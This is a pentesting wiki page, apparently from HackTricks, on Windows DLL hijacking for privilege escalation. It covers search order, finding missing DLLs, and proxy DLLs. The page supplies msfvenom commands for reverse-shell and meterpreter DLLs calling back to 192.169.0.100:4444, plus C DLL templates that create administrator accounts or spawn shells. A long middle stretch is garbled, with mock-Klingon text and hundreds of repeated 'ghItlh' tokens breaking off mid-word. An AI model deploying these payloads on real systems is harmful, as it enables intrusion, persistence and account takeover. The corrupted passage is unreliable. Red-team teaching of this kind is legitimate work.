# Dll Hijacking

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks AWS Red Team Expert</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).

{% embed url="https://www.stmcyber.com/careers" %}

## Basic Information

DLL Hijacking involves manipulating a trusted application into loading a malicious DLL. This term encompasses several tactics like **DLL Spoofing, Injection, and Side-Loading**. It's mainly utilized for code execution, achieving persistence, and, less commonly, privilege escalation. Despite the focus on escalation here, the method of hijacking remains consistent across objectives.

### Common Techniques

Several methods are employed for DLL hijacking, each with its effectiveness depending on the application's DLL loading strategy:

1. **DLL Replacement**: Swapping a genuine DLL with a malicious one, optionally using DLL Proxying to preserve the original DLL's functionality.
2. **DLL Search Order Hijacking**: Placing the malicious DLL in a search path ahead of the legitimate one, exploiting the application's search pattern.
3. **Phantom DLL Hijacking**: Creating a malicious DLL for an application to load, thinking it's a non-existent required DLL.
4. **DLL Redirection**: Modifying search parameters like `%PATH%` or `.exe.manifest` / `.exe.local` files to direct the application to the malicious DLL.
5. **WinSxS DLL Replacement**: Substituting the legitimate DLL with a malicious counterpart in the WinSxS directory, a method often associated with DLL side-loading.
6. **Relative Path DLL Hijacking**: Placing the malicious DLL in a user-controlled directory with the copied application, resembling Binary Proxy Execution techniques.


## Finding missing Dlls

The most common way to find missing Dlls inside a system is running [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from sysinternals, **setting** the **following 2 filters**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

and just show the **File System Activity**:

![](<../../.gitbook/assets/image (314).png>)

If you are looking for **missing dlls in general** you **leave** this running for some **seconds**.\
If you are looking for a **missing dll inside an specific executable** you should set **another filter like "Process Name" "contains" "\<exec name>", execute it, and stop capturing events**.

## Exploiting Missing Dlls

In order to escalate privileges, the best chance we have is to be able to **write a dll that a privilege process will try to load** in some of **place where it is going to be searched**. Therefore, we will be able to **write** a dll in a **folder** where the **dll is searched before** the folder where the **original dll** is (weird case), or we will be able to **write on some folder where the dll is going to be searched** and the original **dll doesn't exist** on any folder.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications** look for DLLs by following a set of **pre-defined search paths**, adhering to a particular sequence. The issue of DLL hijacking arises when a harmful DLL is strategically placed in one of these directories, ensuring it gets loaded before the authentic DLL. A solution to prevent this is to ensure the application uses absolute paths when referring to the DLLs it requires.

You can see the **DLL search order on 32-bit** systems below:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

That is the **default** search order with **SafeDllSearchMode** enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value and set it to 0 (default is enabled).

If [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function is called with **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** the search begins in the directory of the executable module that **LoadLibraryEx** is loading.

Finally, note that **a dll could be loaded indicating the absolute path instead just the name**. In that case that dll is **only going to be searched in that path** (if the dll has any dependencies, they are going to be searched as just loaded by name).

There are other ways to alter the ways to alter the search order but I'm not going to explain them here.
#### tlhIngan Hol

#### Windows docs vItlhutlh

Windows documentation vItlhutlh, **DLL** search order vItlhutlh vItlhutlh:

- **DLL** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghIt
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
ghItlh **PATH** vItlhutlh **ghItlh permissions**.
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
**Klingon Translation:**

jIyajbe' 'ej jIyajbe' Dll exports 'ej executable imports.
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) or from[ **High Integrity to SYSTEM**](./#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Get a meterpreter (x86):**

**tlhIngan Hol translation:**

**Get a meterpreter (x86):**

**tlhIngan Hol translation:**

**Get a meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Qapla'! (x86 x64 version jImejDaq 'e' vItlhutlh):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### jImej

ghorgh, Dll Daq ghaH 'ej **chelHa'** vItlhutlhlaHbe'chugh, 'ach 'oH **binary vItlhutlh** 'e' vItlhutlhlaHbe'chugh, 'ej **exploit vItlhutlh**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## References
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
